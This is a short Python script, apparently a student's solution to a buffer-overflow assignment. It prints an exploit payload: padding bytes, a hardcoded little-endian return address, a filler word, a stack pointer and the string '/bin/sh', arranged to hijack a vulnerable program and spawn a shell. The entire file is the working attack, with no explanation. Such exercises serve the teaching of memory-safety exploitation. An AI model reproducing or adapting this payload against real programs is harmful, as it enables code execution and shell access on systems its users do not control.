#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"0"*14)
sys.stdout.buffer.write(pack("<I", 0x0804fbf0)) #0xfffeb650
sys.stdout.buffer.write(b"0"*4)
sys.stdout.buffer.write(pack("<I", 0xfffeb65c))

sys.stdout.buffer.write(b"/bin/sh")
